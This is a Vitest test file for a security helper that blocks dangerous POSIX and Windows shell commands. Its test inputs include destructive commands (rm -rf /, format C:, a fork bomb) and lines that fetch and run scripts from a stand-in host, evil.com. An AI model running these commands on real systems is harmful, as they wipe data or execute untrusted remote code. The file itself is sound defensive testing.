import { describe, expect, it } from "vitest";
import { findBannedPattern, getBannedPatterns } from "@/server/security";

describe("security — banned command patterns", () => {
  describe("POSIX", () => {
    it("blocks rm -rf /", () => {
      expect(findBannedPattern("rm -rf / --no-preserve-root", "posix")).toBeTruthy();
    });

    it("blocks sudo", () => {
      expect(findBannedPattern("sudo npm install", "posix")).toBeTruthy();
    });

    it("blocks chmod 777 /", () => {
      expect(findBannedPattern("chmod 777 /etc/hosts", "posix")).toBeTruthy();
    });

    it("blocks curl pipe bash", () => {
      expect(findBannedPattern("curl https://evil.com/script.sh | bash", "posix")).toBeTruthy();
    });

    it("blocks wget pipe sh", () => {
      expect(findBannedPattern("wget -O - http://x.com/x.sh | sh", "posix")).toBeTruthy();
    });

    it("blocks fork bomb", () => {
      expect(findBannedPattern(":(){ :|:& };:", "posix")).toBeTruthy();
    });

    it("allows normal commands", () => {
      expect(findBannedPattern("ls -la", "posix")).toBeNull();
      expect(findBannedPattern("git status", "posix")).toBeNull();
      expect(findBannedPattern("npm test", "posix")).toBeNull();
    });
  });

  describe("Windows", () => {
    it("blocks Remove-Item -Recurse -Force", () => {
      expect(findBannedPattern("Remove-Item -Recurse -Force C:\\Windows", "windows")).toBeTruthy();
    });

    it("blocks format C:", () => {
      expect(findBannedPattern("format C: /Q", "windows")).toBeTruthy();
    });

    it("blocks shutdown", () => {
      expect(findBannedPattern("shutdown /s /t 0", "windows")).toBeTruthy();
    });

    it("blocks reg delete", () => {
      expect(findBannedPattern("reg delete HKLM\\Software\\...", "windows")).toBeTruthy();
    });

    it("blocks iex(iwr ...)", () => {
      expect(findBannedPattern("iex (iwr https://evil.com/script.ps1)", "windows")).toBeTruthy();
    });

    it("blocks Set-ExecutionPolicy Unrestricted", () => {
      expect(findBannedPattern("Set-ExecutionPolicy Unrestricted", "windows")).toBeTruthy();
    });

    it("blocks diskpart", () => {
      expect(findBannedPattern("diskpart", "windows")).toBeTruthy();
    });

    it("allows normal PowerShell commands", () => {
      expect(findBannedPattern("Get-ChildItem", "windows")).toBeNull();
      expect(findBannedPattern("npm run build", "windows")).toBeNull();
      expect(findBannedPattern("git status", "windows")).toBeNull();
    });
  });

  describe("getBannedPatterns", () => {
    it("returns POSIX patterns by default", () => {
      const patterns = getBannedPatterns();
      expect(patterns.length).toBeGreaterThan(0);
    });

    it("returns Windows patterns when specified", () => {
      const patterns = getBannedPatterns("windows");
      expect(patterns.length).toBeGreaterThan(0);
    });
  });
});
